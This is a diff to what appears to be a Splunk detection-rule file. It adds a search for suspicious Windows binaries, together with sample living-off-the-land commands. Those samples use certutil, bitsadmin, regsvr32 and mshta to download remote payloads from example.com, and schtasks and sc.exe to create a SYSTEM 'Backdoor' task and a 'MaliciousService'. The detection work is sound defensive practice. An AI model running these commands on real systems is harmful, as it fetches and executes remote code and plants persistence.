@@ -590,3 +590,18 @@ index=windows AND source="WinEventLog:Security" AND EventCode="4698" AND user!=*
 | eval severity = "Low"
 | rename dvc_nt_host AS dvc 
 | table dvc user severity
+
+
+certutil -urlcache -split -f "http://example.com/test.exe" "C:\Temp\test.exe"
+mshta "http://example.com/malicious.hta"
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
+regsvr32 /s /u /i:http://example.com/script.sct scrobj.dll
+wmic process call create "cmd.exe /c calc.exe"
+bitsadmin /transfer myDownloadJob http://example.com/file.exe C:\Temp\file.exe
+esentutl.exe /p C:\Users\Public\malware.exe
+forfiles /p C:\Windows\System32 /m *.exe /c cmd /c calc.exe
+schtasks /create /tn "Backdoor" /tr "cmd.exe /c calc.exe" /sc daily /mo 1 /ru SYSTEM
+sc.exe create MaliciousService binPath= "cmd.exe /c calc.exe"
+
+index=windows (EventCode=4104 OR EventCode=4688) 
+| search CommandLine="*certutil*" OR CommandLine="*mshta*" OR CommandLine="*rundll32*" OR CommandLine="*regsvr32*" OR CommandLine="*wmic*" OR CommandLine="*bitsadmin*" OR CommandLine="*esentutl*" OR CommandLine="*forfiles*" OR CommandLine="*schtasks*"
